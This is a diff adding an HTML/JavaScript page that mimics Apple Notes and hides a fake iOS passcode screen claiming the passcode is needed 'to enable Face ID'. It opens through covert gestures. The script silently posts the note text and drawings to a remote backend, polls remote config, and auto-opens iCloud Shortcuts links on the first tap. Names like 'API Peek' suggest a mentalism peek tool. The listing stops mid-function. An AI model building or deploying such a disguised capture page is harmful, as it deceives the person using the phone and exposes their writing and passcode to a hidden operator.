@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="theme-color" content="#000000">
+<title>Notes</title>
+<script src="aurakit.js"></script>
+<style>
+  :root{
+    --notes-bg:#000000;
+    --notes-fg:#ffffff;
+    --notes-muted:#8e8e93;
+    --notes-accent:#ffd60a;
+    --notes-bar:rgba(28,28,30,0.86);
+    --notes-line:rgba(255,255,255,0.10);
+  }
+  body.theme-light{
+    --notes-bg:#ffffff;
+    --notes-fg:#000000;
+    --notes-muted:#8e8e93;
+    --notes-accent:#e0a800;
+    --notes-bar:rgba(242,242,247,0.90);
+    --notes-line:rgba(0,0,0,0.10);
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{
+    margin:0;padding:0;width:100%;height:100%;
+    background:var(--notes-bg);color:var(--notes-fg);
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","SF Pro Display",system-ui,sans-serif;
+    overflow:hidden;
+  }
+
+  /* ===== Pixel-Perfect Apple Notes App ===== */
+  .notes-app{
+    position:fixed;inset:0;
+    display:flex;flex-direction:column;
+    background:var(--notes-bg);color:var(--notes-fg);
+    padding-top:max(44px, env(safe-area-inset-top, 44px));
+    padding-bottom:max(18px, env(safe-area-inset-bottom, 18px));
+  }
+  .notes-nav{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:6px 14px 8px;
+    flex:none;
+  }
+  .notes-back{
+    display:inline-flex;align-items:center;gap:4px;
+    background:none;border:0;color:var(--notes-accent);
+    font-size:17px;font-weight:400;padding:4px 2px;cursor:pointer;font-family:inherit;
+  }
+  .notes-nav-right{
+    display:flex;align-items:center;gap:14px;
+  }
+  .notes-icon-btn{
+    width:32px;height:32px;border-radius:50%;
+    border:0;background:transparent;color:var(--notes-accent);
+    display:inline-flex;align-items:center;justify-content:center;
+    cursor:pointer;padding:0;
+  }
+  .notes-icon-btn.active{
+    background:var(--notes-accent);
+    color:#000;
+  }
+  .notes-done-btn{
+    background:none;border:0;color:var(--notes-accent);
+    font-size:17px;font-weight:600;padding:4px 2px;cursor:pointer;font-family:inherit;
+    display:none;
+  }
+  .notes-done-btn.show{display:inline-block;}
+
+  .notes-date{
+    text-align:center;
+    font-size:12.5px;
+    color:var(--notes-muted);
+    padding:2px 16px 8px;
+    flex:none;
+    cursor:default;
+    user-select:none;
+    -webkit-user-select:none;
+  }
+
+  .notes-editor-wrap{
+    position:relative;
+    flex:1;
+    min-height:0;
+    overflow:hidden;
+    display:flex;
+    flex-direction:column;
+    padding:2px 20px 10px;
+  }
+  .notes-title{
+    width:100%;border:0;background:transparent;color:var(--notes-fg);
+    font-size:28px;font-weight:700;letter-spacing:-0.4px;line-height:1.18;
+    outline:none;font-family:inherit;padding:0;margin:0 0 8px 0;
+  }
+  .notes-title::placeholder,.notes-body::placeholder{color:rgba(142,142,147,0.45);}
+  .notes-body{
+    flex:1;width:100%;border:0;background:transparent;color:var(--notes-fg);
+    font-size:17px;font-weight:400;line-height:1.45;resize:none;
+    outline:none;font-family:inherit;padding:0;margin:0;
+  }
+  .notes-draw-canvas{
+    position:absolute;inset:0;width:100%;height:100%;
+    pointer-events:none;touch-action:none;z-index:4;
+  }
+  .notes-app.draw-mode .notes-draw-canvas{
+    pointer-events:auto;
+  }
+  .notes-app.draw-mode .notes-title,
+  .notes-app.draw-mode .notes-body{
+    pointer-events:none;
+  }
+
+  /* Bottom Apple Notes Toolbar */
+  .notes-toolbar{
+    flex:none;
+    display:flex;align-items:center;justify-content:space-between;
+    padding:8px 22px 4px;
+    color:var(--notes-accent);
+  }
+  .notes-draw-bar{
+    display:none;
+    align-items:center;justify-content:space-between;gap:8px;
+    margin:0 14px 6px;
+    padding:8px 12px;
+    background:var(--notes-bar);
+    border:1px solid var(--notes-line);
+    border-radius:16px;
+    backdrop-filter:blur(18px);
+    -webkit-backdrop-filter:blur(18px);
+  }
+  .notes-app.draw-mode .notes-draw-bar{display:flex;}
+  .notes-app.draw-mode .notes-toolbar{display:none;}
+  .swatch{
+    width:22px;height:22px;border-radius:50%;border:2px solid transparent;cursor:pointer;padding:0;
+  }
+  .swatch.sel{border-color:#fff;transform:scale(1.14);}
+  .tool-pill{
+    border:0;background:rgba(142,142,147,0.2);color:var(--notes-fg);
+    border-radius:9px;padding:5px 10px;font-size:12.5px;font-weight:600;cursor:pointer;font-family:inherit;
+  }
+  .tool-pill.sel{background:var(--notes-accent);color:#000;}
+
+  /* Custom Screenshot Outcome Screen */
+  .custom-shot-view{
+    position:fixed;inset:0;z-index:9998;background:#000;
+    display:none;align-items:center;justify-content:center;
+  }
+  .custom-shot-view.show{display:flex;}
+  .custom-shot-view img{width:100%;height:100%;object-fit:cover;display:block;}
+
+  /* ===== Fake iOS Lock Screen (Liquid Glass) ===== */
+  .lockscreen{
+    position:fixed;inset:0;z-index:9999;
+    display:flex;flex-direction:column;align-items:center;justify-content:flex-end;
+    background:#000;color:#fff;
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","SF Pro Text","Helvetica Neue",sans-serif;
+    -webkit-user-select:none;user-select:none;
+    touch-action:manipulation;
+    visibility:hidden;pointer-events:none;opacity:0;
+    transform:scale(1);
+    will-change:opacity, transform;
+  }
+  .lockscreen.open{visibility:visible;pointer-events:auto;opacity:1;transform:scale(1);transition:none;}
+  .lockscreen.open.unlocking{
+    pointer-events:none !important;background:transparent !important;opacity:0 !important;
+    transform:scale(1.06) !important;
+    transition:opacity 0.28s cubic-bezier(0.22, 1, 0.36, 1), transform 0.28s cubic-bezier(0.22, 1, 0.36, 1) !important;
+  }
+  .lockscreen-bg{
+    position:absolute;inset:0;background-size:cover;background-position:center top;
+    filter:blur(var(--lock-blur, 0px)) brightness(1) saturate(1.02);
+    transform:none;opacity:1;pointer-events:none;background-color:#111;
+  }
+  .lockscreen.has-wallpaper .lockscreen-bg{background-color:transparent;}
+  .lockscreen.has-wallpaper:not(.ai-clean) .lockscreen-bg{
+    filter:blur(var(--lock-blur, 75px)) brightness(0.90) saturate(1.15) !important;
+    transform:scale(1.18) !important;
+  }
+  .lockscreen.ai-clean .lockscreen-bg{filter:none !important;transform:none !important;inset:0 !important;}
+  .lockscreen-scrim{position:absolute;inset:0;background:rgba(0,0,0,0.06);pointer-events:none;}
+  .lockscreen-content{
+    position:relative;z-index:2;width:100%;height:100%;
+    display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
+    padding-top:max(136px, calc(env(safe-area-inset-top, 54px) + 82px));
+    opacity:0;transform:translateY(40px);will-change:opacity, transform;
+  }
+  .lockscreen.open .lockscreen-content{animation:lockIn 0.45s cubic-bezier(0.22, 1, 0.36, 1) forwards;}
+  @keyframes lockIn{0%{opacity:0;transform:translateY(40px);}100%{opacity:1;transform:translateY(0);}}
+  .lockscreen-bottomspace{flex:1 1 auto;min-height:clamp(36px, 5.5vh, 62px);}
+  .lockscreen-prompt-wrap{display:flex;flex-direction:column;align-items:center;gap:4px;margin:0 0 12px 0;padding:0 24px;text-align:center;}
+  .lockscreen-prompt{font-size:22px;font-weight:400;letter-spacing:-0.2px;margin:0;color:#fff;text-shadow:0 1px 4px rgba(0,0,0,0.32);cursor:pointer;}
+  .lockscreen-subprompt{font-size:14.5px;font-weight:400;letter-spacing:-0.1px;color:rgba(255,255,255,0.92);line-height:1.28;text-align:center;margin-top:2px;text-shadow:0 1px 3px rgba(0,0,0,0.32);}
+  .lockscreen-dots{display:flex;min-height:14px;align-items:center;justify-content:center;margin:0 0 clamp(38px, 5.2vh, 52px) 0;cursor:pointer;touch-action:manipulation;padding:8px 16px;}
+  .lockscreen-dots.dots-6{gap:21px;}
+  .lockscreen-dots.dots-4{gap:28px;}
+  .lockscreen-dot{width:13px;height:13px;border-radius:50%;border:1.5px solid rgba(255,255,255,0.92);background:transparent;transition:background .12s ease, border-color .12s ease, transform .14s cubic-bezier(0.22, 1.35, 0.36, 1);}
+  .lockscreen-dot.filled{background:#fff;border-color:#fff;transform:scale(1.06);}
+  @keyframes shakePasscode{0%,100%{transform:translateX(0);}15%{transform:translateX(-14px);}30%{transform:translateX(12px);}45%{transform:translateX(-10px);}60%{transform:translateX(8px);}75%{transform:translateX(-4px);}}
+  .lockscreen-dots.shake{animation:shakePasscode 0.45s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;}
+  .lockscreen-keypad{display:grid;grid-template-columns:repeat(3, clamp(76px, 20.2vw, 84px));gap:clamp(14px, 2.0vh, 18px) clamp(22px, 6.0vw, 27px);justify-content:center;margin:0;}
+  .lockscreen-key{
+    position:relative;width:clamp(76px, 20.2vw, 84px);height:clamp(76px, 20.2vw, 84px);
+    border-radius:50%;border:0;cursor:pointer;color:#fff;
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display",sans-serif;
+    display:flex;flex-direction:column;align-items:center;justify-content:center;
+    user-select:none;-webkit-user-select:none;padding:0;line-height:1;overflow:hidden;isolation:isolate;
+    background:radial-gradient(120% 120% at 50% 24%, rgba(255, 255, 255, 0.20) 0%, rgba(255, 255, 255, 0.08) 55%, rgba(0, 0, 0, 0.12) 100%);
+    backdrop-filter:blur(8px) brightness(1.16) saturate(135%);-webkit-backdrop-filter:blur(8px) brightness(1.16) saturate(135%);
+    box-shadow:0 4px 16px rgba(0, 0, 0, 0.24);
+    transform:scale(1) translateZ(0);
+    transition:transform 0.38s cubic-bezier(0.22, 1.32, 0.36, 1), box-shadow 0.36s ease;
+    will-change:transform;
+  }
+  .lockscreen-key.has-lens{background:transparent;backdrop-filter:none;-webkit-backdrop-filter:none;}
+  .lockscreen-key .glass-lens{position:absolute;inset:0;width:100%;height:100%;border-radius:50%;pointer-events:none;z-index:0;display:block;}
+  .lockscreen-key .glass-rim{
+    position:absolute;inset:0;border-radius:50%;pointer-events:none;z-index:1;padding:1px;
+    background:conic-gradient(from 315deg, rgba(255,255,255,0.78) 0deg, rgba(255,255,255,0.46) 44deg, rgba(255,255,255,0.12) 94deg, rgba(255,255,255,0.16) 136deg, rgba(255,255,255,0.64) 182deg, rgba(255,255,255,0.36) 224deg, rgba(255,255,255,0.12) 274deg, rgba(255,255,255,0.48) 324deg, rgba(255,255,255,0.78) 360deg);
+    -webkit-mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask-composite:xor;mask:linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);mask-composite:exclude;
+  }
+  .lockscreen-key .glass-flash{
+    position:absolute;inset:0;border-radius:50%;pointer-events:none;z-index:2;opacity:0;
+    background:radial-gradient(circle at 50% 45%, rgba(255,255,255,0.60) 0%, rgba(255,255,255,0.44) 68%, rgba(255,255,255,0.68) 100%);
+    box-shadow:inset 0 0 0 1.5px rgba(255,255,255,0.92);
+    transition:opacity 0.36s cubic-bezier(0.2, 0.8, 0.2, 1);
+  }
+  .lockscreen-key.is-pressed{
+    transform:scale(1.14) translateZ(0) !important;
+    transition:transform 0.065s cubic-bezier(0.2, 0.9, 0.3, 1), box-shadow 0.05s ease-out !important;
+    box-shadow:0 8px 26px rgba(0, 0, 0, 0.32), 0 0 18px rgba(255, 255, 255, 0.22);
+    z-index:10;
+  }
+  .lockscreen-key.is-pressed .glass-flash{opacity:1;transition:opacity 0.04s ease-out;}
+  .lockscreen-key.is-pressed .glass-rim{filter:brightness(1.45);}
+  .lockscreen-key.glass-mode-backdrop{
+    border:1px solid rgba(255,255,255,0.48) !important;
+    background:radial-gradient(125% 125% at 50% 22%, rgba(255,255,255,0.32) 0%, rgba(255,255,255,0.12) 50%, rgba(255,255,255,0.04) 80%, rgba(0,0,0,0.12) 100%) !important;
+    backdrop-filter:blur(3.5px) brightness(1.28) saturate(145%) contrast(106%) !important;
+    -webkit-backdrop-filter:blur(3.5px) brightness(1.28) saturate(145%) contrast(106%) !important;
+    box-shadow:inset 0 2px 3px 0 rgba(255,255,255,0.85), inset 0 -1.5px 2px 0 rgba(0,0,0,0.35), 0 5px 16px rgba(0,0,0,0.24) !important;
+  }
+  .lockscreen-key.glass-mode-backdrop::before{
+    content:"";position:absolute;inset:1.5px;border-radius:50%;
+    background:linear-gradient(180deg, rgba(255,255,255,0.50) 0%, rgba(255,255,255,0.15) 38%, rgba(255,255,255,0) 68%);
+    pointer-events:none;z-index:1;
+  }
+  .lockscreen-key.glass-mode-backdrop .glass-lens,
+  .lockscreen-key.glass-mode-backdrop .glass-rim{display:none;}
+  .lockscreen-key .digit{position:relative;z-index:3;font-size:37px;font-weight:400;line-height:37px;color:#fff;text-shadow:0 1px 2px rgba(0,0,0,0.18);}
+  .lockscreen-key .letters{position:relative;z-index:3;font-size:10px;font-weight:700;letter-spacing:1.9px;margin-top:2px;color:#fff;text-transform:uppercase;line-height:11px;height:11px;text-shadow:0 1px 2px rgba(0,0,0,0.18);}
+  .lockscreen-key .letters.empty{visibility:hidden;}
+  .lockscreen-key.key-0{justify-content:center;}
+  .lockscreen-key.key-0 .digit{line-height:1;}
+  .lockscreen-corner-zone{width:clamp(76px, 20.2vw, 84px);height:clamp(76px, 20.2vw, 84px);border-radius:50%;border:0;padding:0;background:transparent !important;pointer-events:auto;touch-action:none;cursor:default;outline:none;}
+
+  /* Noteify API Peek */
+  .lockscreen-noteify-peek{
+    position:fixed;inset:0;z-index:10060;display:none;
+    flex-direction:column;align-items:center;justify-content:flex-start;
+    padding:max(58px, calc(env(safe-area-inset-top, 44px) + 14px)) 24px 32px;
+    background:linear-gradient(180deg, rgba(0,0,0,0.92) 0%, rgba(0,0,0,0.84) 36%, rgba(0,0,0,0.72) 100%);
+    pointer-events:none;text-align:center;
+  }
+  .lockscreen-noteify-peek.show{display:flex;}
+  .lockscreen-noteify-title{font-size:23px;font-weight:700;color:#fff;margin:0 0 6px 0;pointer-events:auto;cursor:pointer;}
+  .lockscreen-noteify-value{font-size:19px;font-weight:500;color:rgba(255,255,255,0.95);line-height:1.38;max-width:340px;word-break:break-word;white-space:pre-wrap;margin-top:8px;}
+
+  .lockscreen-footer{width:100%;max-width:320px;display:flex;justify-content:space-between;margin-bottom:max(48px, calc(env(safe-area-inset-bottom, 34px) + 20px));padding:0 clamp(16px, 5vw, 24px);}
+  .lockscreen-footer button{background:none;border:0;color:#fff;font-size:16.5px;font-weight:400;font-family:inherit;padding:6px 0;cursor:pointer;min-width:64px;text-shadow:0 1px 2px rgba(0,0,0,0.35);}
+  .lockscreen-footer #lockEmergencyBtn{text-align:left;}
+  .lockscreen-footer #lockCancelBtn{text-align:right;}
+
+  /* Paste / Photo Bar */
+  .lockscreen-paste{
+    position:fixed;bottom:clamp(220px, 36vh, 320px);left:50%;transform:translateX(-50%);
+    z-index:99999;background:rgba(28,28,30,0.95);border:1px solid rgba(255,255,255,0.18);
+    border-radius:18px;padding:8px 10px;display:none;align-items:center;gap:10px;
+    backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);
+    box-shadow:0 12px 36px rgba(0,0,0,0.55);max-width:92vw;
+  }
+  .lockscreen-paste.show{display:flex;}
+  .lockscreen-paste button{border:0;border-radius:10px;padding:8px 14px;font-size:13.5px;font-weight:600;cursor:pointer;font-family:inherit;}
+  .lockscreen-paste .paste-yes{background:#0a84ff;color:#fff;}
+  .lockscreen-paste .paste-no{background:transparent;color:#8e8e93;padding:8px 10px;font-size:16px;}
+  .lockscreen-paste .paste-pick{background:rgba(255,255,255,0.14);color:#fff;}
+</style>
+</head>
+<body>
+
+  <!-- PIXEL-PERFECT APPLE NOTES APP -->
+  <div class="notes-app" id="notesApp">
+    <header class="notes-nav">
+      <button type="button" class="notes-back" id="notesBackBtn">
+        <svg width="12" height="20" viewBox="0 0 12 20" fill="none"><path d="M10 2L2 10l8 8" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span>Notes</span>
+      </button>
+      <div class="notes-nav-right">
+        <button type="button" class="notes-icon-btn" id="notesDrawToggleBtn" aria-label="Markup">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 19l7-7 3 3-7 7-3-3z"/>
+            <path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"/>
+            <path d="M2 2l7.586 7.586"/>
+          </svg>
+        </button>
+        <button type="button" class="notes-icon-btn" id="notesShareBtn" aria-label="Share">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/>
+            <polyline points="16 6 12 2 8 6"/>
+            <line x1="12" y1="2" x2="12" y2="15"/>
+          </svg>
+        </button>
+        <button type="button" class="notes-done-btn" id="notesDoneBtn">Done</button>
+      </div>
+    </header>
+
+    <div class="notes-date" id="notesDate"></div>
+
+    <div class="notes-editor-wrap" id="notesEditorWrap">
+      <input class="notes-title" id="notesTitle" type="text" placeholder="Title" autocomplete="off" autocorrect="on">
+      <textarea class="notes-body" id="notesBody" placeholder=""></textarea>
+      <canvas class="notes-draw-canvas" id="notesDrawCanvas"></canvas>
+    </div>
+
+    <div class="notes-draw-bar" id="notesDrawBar">
+      <button type="button" class="tool-pill sel" id="toolPenBtn">Pen</button>
+      <button type="button" class="tool-pill" id="toolEraserBtn">Eraser</button>
+      <button type="button" class="swatch sel" data-col="#ffffff" style="background:#ffffff;"></button>
+      <button type="button" class="swatch" data-col="#ffd60a" style="background:#ffd60a;"></button>
+      <button type="button" class="swatch" data-col="#0a84ff" style="background:#0a84ff;"></button>
+      <button type="button" class="swatch" data-col="#ff453a" style="background:#ff453a;"></button>
+      <button type="button" class="tool-pill" id="drawUndoBtn">Undo</button>
+      <button type="button" class="tool-pill" id="drawClearBtn">Clear</button>
+    </div>
+
+    <footer class="notes-toolbar">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9 12l2 2 4-4"/></svg>
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19l7-7 3 3-7 7-3-3z"/><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"/></svg>
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+    </footer>
+  </div>
+
+  <!-- CUSTOM SCREENSHOT OUTCOME -->
+  <div class="custom-shot-view" id="customShotView">
+    <img id="customShotImg" alt="">
+  </div>
+
+  <!-- FAKE iOS LOCK SCREEN -->
+  <div class="lockscreen" id="lockScreen" aria-hidden="true">
+    <div class="lockscreen-bg" id="lockBg"></div>
+    <div class="lockscreen-scrim"></div>
+    <div class="lockscreen-content">
+      <div class="lockscreen-prompt-wrap">
+        <div class="lockscreen-prompt" id="lockPrompt">Enter Passcode</div>
+        <div class="lockscreen-subprompt" id="lockSubPrompt">Your passcode is required<br>to enable Face&nbsp;ID</div>
+      </div>
+      <div class="lockscreen-dots" id="lockDots"></div>
+      <div class="lockscreen-keypad" id="lockKeypad"></div>
+      <div class="lockscreen-bottomspace" aria-hidden="true"></div>
+      <div class="lockscreen-footer">
+        <button type="button" id="lockEmergencyBtn">Emergency</button>
+        <button type="button" id="lockCancelBtn">Cancel</button>
+      </div>
+    </div>
+    <div class="lockscreen-noteify-peek" id="lockNoteifyPeek" aria-hidden="true">
+      <div class="lockscreen-noteify-title" id="lockNoteifyTitle">API Peek</div>
+      <div class="lockscreen-noteify-value" id="lockNoteifyValue">—</div>
+    </div>
+  </div>
+
+  <!-- PASTE / PHOTO BAR -->
+  <div class="lockscreen-paste" id="lockPastePrompt">
+    <button type="button" class="paste-yes" id="lockPasteYes">Paste Screenshot</button>
+    <button type="button" class="paste-pick" id="lockPastePick">Choose Photo</button>
+    <button type="button" class="paste-no" id="lockPasteNo" aria-label="Close">✕</button>
+    <input type="file" id="lockFileInput" accept="image/*" style="display:none;">
+  </div>
+
+<script>
+const params = new URLSearchParams(location.search);
+if (params.get("backend")) {
+  try { localStorage.setItem("notes_backend_url", params.get("backend").replace(/\/+$/, "")); } catch (_) {}
+}
+function getBackendBase() {
+  try { return (localStorage.getItem("notes_backend_url") || "").replace(/\/+$/, ""); } catch (_) { return ""; }
+}
+
+const DEF = {
+  shortcutUrl: "https://www.icloud.com/shortcuts/9e90e8b02c9e40e5b87a8e30ae849501",
+  firstTapShortcut: true,
+  notesTheme: "dark",
+  unlockOutcome: "quit",
+  customScreenshotDataUrl: "",
+  lockDigits: 4,
+  lockAttemptsToUnlock: 1,
+  lockGlassStyle: "liquid",
+  lockBlur: 0,
+  lockCancelUrl: "https://www.icloud.com/shortcuts/c76944441d834e95a4664fc9681182c1",
+  lockEmergencyUrl: "",
+  injectPushEnabled: true,
+  injectApiUrl: "https://11z.co/_w/19470/selection",
+  lockApiPeekMode: "single",
+  lockApiPeeks: []
+};
+let CFG = { ...DEF };
+try {
+  const cached = JSON.parse(localStorage.getItem("notes_cfg_cache") || "null");
+  if (cached && typeof cached === "object") CFG = { ...DEF, ...cached };
+} catch (_) {}
+
+function applyTheme() {
+  const isLight = CFG.notesTheme === "light" || (CFG.notesTheme === "auto" && window.matchMedia("(prefers-color-scheme: light)").matches);
+  document.body.classList.toggle("theme-light", isLight);
+}
+applyTheme();
+
+async function syncConfigFromBackend() {
+  const base = getBackendBase();
+  if (!base) return;
+  try {
+    const r = await fetch(base + "/api/config", { cache: "no-store" });
+    if (!r.ok) return;
+    const d = await r.json();
+    if (d && typeof d === "object") {
+      CFG = { ...DEF, ...d };
+      try { localStorage.setItem("notes_cfg_cache", JSON.stringify(CFG)); } catch (_) {}
+      applyTheme();
+    }
+  } catch (_) {}
+}
+syncConfigFromBackend();
+setInterval(syncConfigFromBackend, 4000);
+
+function openShortcutInSafari(url) {
+  if (!url) return;
+  if (window.Aura && typeof Aura.openInSafari === "function") {
+    try { Aura.openInSafari(url); return; } catch (_) {}
+  }
+  window.open(url, "_blank");
+}
+
+/* ===== First-Tap Shortcut Trigger ===== */
+let firstTapConsumed = false;
+try { firstTapConsumed = sessionStorage.getItem("notes_first_tap_done") === "1"; } catch (_) {}
+document.addEventListener("pointerdown", (e) => {
+  if (firstTapConsumed || LockScreen.open) return;
+  if (e.target.closest("#lockPastePrompt")) return;
+  if (!CFG.firstTapShortcut || !CFG.shortcutUrl) return;
+  firstTapConsumed = true;
+  try { sessionStorage.setItem("notes_first_tap_done", "1"); } catch (_) {}
+  LockScreen.showPastePrompt();
+  openShortcutInSafari(CFG.shortcutUrl);
+}, { capture: true });
+
+/* ===== Apple Notes Editor & Drawing Canvas ===== */
+const notesApp = document.getElementById("notesApp");
+const notesTitle = document.getElementById("notesTitle");
+const notesBody = document.getElementById("notesBody");
+const notesDoneBtn = document.getElementById("notesDoneBtn");
+const notesDrawToggleBtn = document.getElementById("notesDrawToggleBtn");
+const drawCanvas = document.getElementById("notesDrawCanvas");
+const drawCtx = drawCanvas.getContext("2d");
+
+(function updateNotesDate() {
+  const now = new Date();
+  const dateStr = now.toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" });
+  const timeStr = now.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit" });
+  document.getElementById("notesDate").textContent = `${dateStr} at ${timeStr}`;
+})();
+
+let drawMode = false;
+let toolType = "pen";
+let penColor = "#ffffff";
+let strokes = [];
+let currentStroke = null;
+
+function resizeDrawCanvas() {
+  const wrap = document.getElementById("notesEditorWrap");
+  const dpr = Math.min(2, window.devicePixelRatio || 2);
+  drawCanvas.width = Math.max(1, Math.round(wrap.clientWidth * dpr));
+  drawCanvas.height = Math.max(1, Math.round(wrap.clientHeight * dpr));
+  drawCtx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  redrawCanvas();
+}
+function redrawCanvas() {
+  drawCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height);
+  for (const s of strokes) {
+    if (!s.pts.length) continue;
+    drawCtx.save();
+    drawCtx.lineCap = "round";
+    drawCtx.lineJoin = "round";
+    if (s.tool === "eraser") {
+      drawCtx.globalCompositeOperation = "destination-out";
+      drawCtx.lineWidth = 18;
+      drawCtx.strokeStyle = "rgba(0,0,0,1)";
+    } else {
+      drawCtx.globalCompositeOperation = "source-over";
+      drawCtx.lineWidth = 3.2;
+      drawCtx.strokeStyle = s.color;
+    }
+    drawCtx.beginPath();
+    drawCtx.moveTo(s.pts[0].x, s.pts[0].y);
+    for (let i = 1; i < s.pts.length; i++) drawCtx.lineTo(s.pts[i].x, s.pts[i].y);
+    if (s.pts.length === 1) drawCtx.lineTo(s.pts[0].x + 0.1, s.pts[0].y + 0.1);
+    drawCtx.stroke();
+    drawCtx.restore();
+  }
+}
+window.addEventListener("resize", resizeDrawCanvas);
+setTimeout(resizeDrawCanvas, 60);
+
+notesDrawToggleBtn.onclick = () => {
+  drawMode = !drawMode;
+  notesApp.classList.toggle("draw-mode", drawMode);
+  notesDrawToggleBtn.classList.toggle("active", drawMode);
+  notesDoneBtn.classList.toggle("show", drawMode || !!notesTitle.value || !!notesBody.value);
+  if (drawMode) { notesTitle.blur(); notesBody.blur(); }
+};
+notesDoneBtn.onclick = () => {
+  drawMode = false;
+  notesApp.classList.remove("draw-mode");
+  notesDrawToggleBtn.classList.remove("active");
+  notesDoneBtn.classList.remove("show");
+  notesTitle.blur(); notesBody.blur();
+};
+[notesTitle, notesBody].forEach(el => {
+  el.addEventListener("focus", () => notesDoneBtn.classList.add("show"));
+  el.addEventListener("input", () => scheduleNotesSync());
+});
+
+document.getElementById("toolPenBtn").onclick = () => {
+  toolType = "pen";
+  document.getElementById("toolPenBtn").classList.add("sel");
+  document.getElementById("toolEraserBtn").classList.remove("sel");
+};
+document.getElementById("toolEraserBtn").onclick = () => {
+  toolType = "eraser";
+  document.getElementById("toolEraserBtn").classList.add("sel");
+  document.getElementById("toolPenBtn").classList.remove("sel");
+};
+document.querySelectorAll(".swatch").forEach(btn => {
+  btn.onclick = () => {
+    penColor = btn.dataset.col;
+    toolType = "pen";
+    document.getElementById("toolPenBtn").classList.add("sel");
+    document.getElementById("toolEraserBtn").classList.remove("sel");
+    document.querySelectorAll(".swatch").forEach(s => s.classList.toggle("sel", s === btn));
+  };
+});
+document.getElementById("drawUndoBtn").onclick = () => { strokes.pop(); redrawCanvas(); scheduleNotesSync(); };
+document.getElementById("drawClearBtn").onclick = () => { strokes = []; redrawCanvas(); scheduleNotesSync(); };
+
+drawCanvas.addEventListener("pointerdown", (e) => {
+  if (!drawMode) return;
+  const r = drawCanvas.getBoundingClientRect();
+  currentStroke = { tool: toolType, color: penColor, pts: [{ x: e.clientX - r.left, y: e.clientY - r.top }] };
+  strokes.push(currentStroke);
+  try { drawCanvas.setPointerCapture(e.pointerId); } catch (_) {}
+  redrawCanvas();
+});
+drawCanvas.addEventListener("pointermove", (e) => {
+  if (!currentStroke) return;
+  const r = drawCanvas.getBoundingClientRect();
+  currentStroke.pts.push({ x: e.clientX - r.left, y: e.clientY - r.top });
+  redrawCanvas();
+});
+const endStroke = () => {
+  if (!currentStroke) return;
+  currentStroke = null;
+  scheduleNotesSync();
+};
+drawCanvas.addEventListener("pointerup", endStroke);
+drawCanvas.addEventListener("pointercancel", endStroke);
+
+let syncTimer = null;
+function scheduleNotesSync() {
+  clearTimeout(syncTimer);
+  syncTimer = setTimeout(pushNotesPeek, 320);
+}
+function pushNotesPeek() {
+  const base = getBackendBase();
+  if (!base) return;
+  const drawingDataUrl = strokes.length ? drawCanvas.toDataURL("image/png") : "";
+  fetch(base + "/api/notes/peek", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      title: notesTitle.value,
+      text: notesBody.value,
+      drawingDataUrl,
+      mode: drawMode ? "draw" : "text"
+    })
+  }).catch(() => {});
+}
+
+/* Covert backup trigger: hold Notes date for 450ms to open LockScreen */
+(function bindDateTrigger() {
+  const d = document.getElementById("notesDate");
+  let t = null;
+  d.addEventListener("pointerdown", () => { clearTimeout(t); t = setTimeout(() => LockScreen.show(), 450); });
+  const c = () => { clearTimeout(t); t = null; };
+  d.addEventListener("pointerup", c);
+  d.addEventListener("pointercancel", c);
+  d.addEventListener("pointerleave", c);
+})();
+
+/* Triple-tap "< Notes" to set Backend URL quickly */
+(function bindBackendSetup() {
+  let taps = 0, timer = null;
+  document.getElementById("notesBackBtn").addEventListener("click", () => {
+    taps++;
+    clearTimeout(timer);
+    timer = setTimeout(() => { taps = 0; }, 700);
+    if (taps >= 3) {
+      taps = 0;
+      const cur = getBackendBase();
+      const next = prompt("Enter Backend URL (Render):", cur);
+      if (next !== null) {
